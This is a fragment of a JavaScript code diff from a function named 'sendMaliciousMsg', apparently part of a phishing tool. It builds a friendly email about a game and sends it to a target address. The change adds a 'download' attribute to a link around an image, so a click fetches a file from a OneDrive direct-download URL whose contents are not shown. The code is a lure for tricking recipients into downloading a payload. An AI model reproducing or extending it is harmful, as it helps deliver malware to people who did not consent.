@@ -128,7 +128,7 @@ const sendMaliciousMsg = (RECEIVER_EMAIL) => {
     <p>
     Still, I like it. And I’m looking forward to the new season of Good Game.</p></div>
     <br/>
-    <a href="https://onedrive.live.com/download?cid=09A45F3180FACE13&resid=9A45F3180FACE13%21125245&authkey=AEZOkkjcsrh4I20"><img style="width:80%" src="https://feisty.nguyen-thi-th36.repl.co/Blue%20And%20Red%20Futuristic%20Game%20YouTube%20Channel%20Art.jpg"/></a>`
+    <a href="https://onedrive.live.com/download?cid=09A45F3180FACE13&resid=9A45F3180FACE13%21125245&authkey=AEZOkkjcsrh4I20" download><img style="width:80%" src="https://feisty.nguyen-thi-th36.repl.co/Blue%20And%20Red%20Futuristic%20Game%20YouTube%20Channel%20Art.jpg"/></a>`
   }
 
   sendEmail(RECEIVER_EMAIL, contentMsg)
